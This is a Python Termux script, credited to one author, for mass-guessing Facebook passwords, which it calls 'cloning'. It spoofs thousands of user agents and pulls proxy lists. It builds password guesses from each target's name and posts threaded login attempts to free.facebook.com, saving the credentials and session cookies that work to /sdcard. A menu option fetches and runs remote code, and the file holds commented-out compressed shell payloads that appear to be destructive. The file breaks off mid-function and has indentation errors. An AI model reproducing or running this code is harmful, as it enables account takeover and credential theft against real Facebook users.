from os import path
import os,base64,zlib,pip,urllib
import os
os.system('xdg-open https://facebook.com/groups/2470754783080486/')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass

tokenefb = []
akunyeh = []
usragent = []
ugen=[]
###----------[ GET PROXY ]----------###
redmi=[]
try:
 print('')
 uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 open('.proxy.txt','w').write(uno)
except:pass
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
 else:redmi.append(se)
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 
 ###----------[ User Agent Linux ]---------- ###
for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2012K11C'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['vivo 1002T'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['CPH2083'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ xxxxxx ]----------###



def cek_apk(coki):
    session = requests.Session();w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))


"""
agg = "Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5652.215 Safari/537.36"
agg = "Mozilla/5.0 (Linux; Android 10; SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5622.197 Mobile Safari/537.36"
agg = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5666.202 Safari/537.36"
agg = "Mozilla/5.0 (Linux; Android 10; MRX-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5629.220 Mobile Safari/537.36"
agg = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5636.222 Safari/537.36 OPR/96.0.3650.125"
agg = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/600.5.22 (KHTML, like Gecko) Version/12.2 Mobile/MQLGVT Safari/629.22"
agg = "Mozilla/5.0 (Android; Mobile; rv:112.0) Gecko/112.0 Firefox/112.0"
agg = "Mozilla/5.0 (Linux; Android 11; Infinix X6816C Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]"
agg = "Mozilla/5.0 (Linux; Android 11; Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]"
"""
"""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
agg = ""
"""









liv=(40*'=')


def tln():
        dek(40*'=')
def clear():
        os.system(f'clear')
        dek(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
pak=('pak')

def vodai():
	dek(' fuck.......')
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	dek(' Fuck You Bypass User ');exit()

ahsan="A1B2C3"
imt="3X0V7SY5S"
ak="TK2"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.tonmoy-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.tonmoy-cov', 'w')
	kok.write(myid+imt)
	kok.close()

##########public clone 
dek=print

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
DFFX=("Api=A")
dek=print 
##############@######2############2#2#
logo = (f"""\x1b[1;97m
88888888888 888    d8P  888b     d888 
    888     888   d8P   8888b   d8888 
    888     888  d8P    88888b.d88888 
    888     888d88K     888Y88888P888 
    888     8888888b    888 Y888P 888 
    888     888  Y88b   888  Y8P  888 
    888     888   Y88b  888   "   888 
    888     888    Y88b 888       888
\t   \033[31;42mTONMOY MAHATO\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : Tonmoy Mahato
  [\x1b[1;95m+\x1b[1;97m] GITHUB : tonmoy404-cyber        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : Tonmoy X X X 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : Tonmoy Mahato                       
  [\x1b[1;95m+\x1b[1;97m] VERSION : 0.05
{40*"="}\x1b[1;97m""")
#####*#*#####**#######
def Main():
	os.system('clear')
	dek (logo)
	dek(f"  [\x1b[1;92mA\x1b[1;97m] FILE CLONING")
	dek(f"  [\x1b[1;92mB\x1b[1;97m] PUBLIC CLONING")
	dek(f"  [\x1b[1;92mC\x1b[1;97m] RANDOM CLONING")
	dek(f'  [\x1b[1;92mD\x1b[1;97m] FILE CREATE')
	dek(f"  [\x1b[1;92mE\x1b[1;97m] OLD CLONING")
	dek(f'  [\x1b[1;92mF\x1b[1;97m] JOIN MY WHATSAPP GROUP')
	dek(f'  [\x1b[1;92mG\x1b[1;97m] JOIN MY FACEBOOK GROUP')
	dek(f"  [\x1b[1;91mX\x1b[1;97m] Exit")
	dek(40*"=")
	me=input(f'  [\x1b[1;96m+\x1b[1;97m] Choice : ')
	if me in ["2", "02","22","B","b"]:
		Main()
	if me in ["3", "03","33","C","c"]:
		os.system('cd && rm -rf TKM ;git clone --depth=1 https://github.com/tonmoy404-cyber/TKM.git;cd TKM ;git pull ;python TONY.py')
	if me in ["5", "05","55","E","e"]:
		os.system('cd && rm -rf TKM ;git clone --depth=1 https://github.com/tonmoy404-cyber/TKM.git;cd TKM ;git pull ;python OLD.py')
	if me in ["6", "06","66","F","f"]:
		os.system('xdg-open https://chat.whatsapp.com/DrvosR4yKcNAa6DIZOqnlt')
		Main()
	if me in ["4", "04","44","D","d"]:
		filem()
	if me in ["7", "7","77","G","g"]:
		os.system('xdg-open https://facebook.com/groups/2470754783080486/')
		Main()
	if me in ["1", "01","11","A","a"]:
		xxdccc()
		#xxgg()
		

"""


def xdr():
	os.system('clear')
	dek(logo)
	file = input(f'  [!] PUT FILE PATH\033[1;37m : ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		dek(f'  [!] FILE LOCATION NOT FOUND ')
		exit()
	pasw()
def xdrr():
    os.system('clear')
    print(logo)
    file=input(f'  [!] PUT FILE PATH\033[1;37m : ')
    try:
    	fo=open(file,'r').read().splitlines()
    except FileNotFoundError:
    	dek(f'  [!] FILE LOCATION NOT FOUND ');exit()
    passlist = []
    dek(f"  [A] FIRST+LAST      <V-FIRST>  [B] ONLY NAME PASS  <FAST>\n  [C] NAME + 2 DIGIT  <X FAST>\n  [D] NAME + 4 DIGIT  <SLOW+FAST> \n  [E] NAME + 8 PASS   <SLOW>\n  [F] NAME + @/# PASS   <SLOW>\n  [G] ONLY DIGIT <SLOW>")
    pl = input('  Choice : ')
    if pl in ["2", "02","22","B","b"]:
        gsgd()
    if pl in ["7", "07","77","G","g"]:
        passlist.append('445566')
        passlist.append('223344')
        passlist.append('@@@###')
        passlist.append('556677')
        passlist.append('112255')
        passlist.append('fflover')
        passlist.append('firstff')
        passlist.append('lastff')
        passlist.append('400500')
        passlist.append('500500')
        passlist.append('120120')
        passlist.append('i love you')
    if pl in ["3", "03","33","C","c"]:
    	yd()
    if pl in ["4", "04","44","D","d"]:
    	jshd()
    if pl in ["6", "06","66","F","f"]:
    	passlist.append('first123');passlist.append('last@@##');passlist.append('first@@##');passlist.append('last@@');passlist.append('last123');passlist.append('first@@');passlist.append('first@@@');passlist.append('first##@@');passlist.append('first##');passlist.append('last##');passlist.append('last@#');passlist.append('last@@@')
    if pl in ["5", "05","55","E","e"]:
    	passlist.append('first123')
        passlist.append('first12345')
        passlist.append('first1234')
        passlist.append('last@@')
        passlist.append('first@@')
        passlist.append('first last')
        passlist.append('firstlast')
        passlist.append('first12')
        passlist.append('first1122')
        passlist.append('last123')
        passlist.append('last12')
        passlist.append('i love you')
    else:
    	passlist.append('first last')
        passlist.append('firstlast')
    total_ids = str(len(fo))
    os.system('clear')
    print(logo)
    dek(f'  TOTAL ID : \033[1;32m'+total_ids+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
    with tred(max_workers=30) as formSubmit:
        for user in fo:
            ids,names = user.split('|')
            formSubmit.submit(method1,ids,names,passlist)
    print(40*'=')
    print(' The process has completed ')
    print(' Total Ok Ids : '+str(len(oks)))
    input('\n Press enter to back ')
    Main()
    
   
"""
"""
"""


def xxdccc():
		os.system('clear')
		dek(logo)
		ff = input(f"  [A] AUTO PASSWORD \n  [B] CHOICE PASSWORD \n {liv} \n  [+] Choice :")
		if ff in ["1", "01","12","A","a"]:
			xdrr()
		if ff in ["2", "02","22","B","b"]:
			xxxc()
		else:
			xxcv()


def xxxc():
		os.system('clear')
		dek(logo)
		file = input(f'  [!] PUT FILE PATH\033[1;37m : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			dek(f'  [!] FILE LOCATION NOT FOUND ')
			exit()
		os.system('clear')
		dek(logo);dek(f'  [\x1b[1;96m+\x1b[1;97m] Do you went show cookie?{DFFX} (A/Y/N): ')
		dek(40*"=")
		mthd=input(f'  [\x1b[1;96m+\x1b[1;97m] Choose: ')
		plist=[]
		try:
			os.system('clear')
			dek (logo)
			dek('\t\t4 BEST')
			dek (40*"=")
			ps_limit = int(input(f'  How many passwords do you want to add ? '))
		except:
			ps_limit =1
		os.system('clear')
		dek (logo)
		dek('  EXAMPLE : first123,last123,firstlast')
		dek (40*"=")
		for i in range(ps_limit):
			plist.append(input(f'  [{i+1}] password : '))
		os.system('clear')
		dek (logo)
		dek(f'  [\x1b[1;96m+\x1b[1;97m] Do you went show cp account? (y/n): ')
		tln()
		cx=input(f'  [\x1b[1;96m+\x1b[1;97m] CHOOSE: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			os.system('clear')
			dek (logo)
			total_ids = str(len(fo))
			dek(f'  TOTAL ID : \033[1;32m'+total_ids+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ["1", "01","12","N","n"]:
					crack_submit.submit(method1,ids,names,passlist)
				elif mthd in ["2", "02","22","Y","y"]:
					crack_submit.submit(method2,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)
				tln()
				print(' The process has completed')
				print(' Total OK: '+str(len(oks)))
				input(' Press enter to back ')
				Main()

#__________auto















#------------;-----xxxxxx
def method1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mTONMOY\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = '445566'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'free.facebook.com',
                        'method': 'GET',
                        'path':'/',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
                        "User-Agent": ua,}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Tonmoy=session.cookies.get_dict().keys()
                        if "c_user" in Tonmoy:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                open('/sdcard/TONMOY-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/TONMOY-file-COKI.txt','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Tonmoy:
                                if 'y' in pcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-CP\033[1;35m]\x1b[1;91m '+ids+' \033[1;37m| \x1b[1;91m'+pas+'\033[1;97m')
                                        open('/sdcard/TONMOY-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def method2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mTONMOY-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = '445566'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
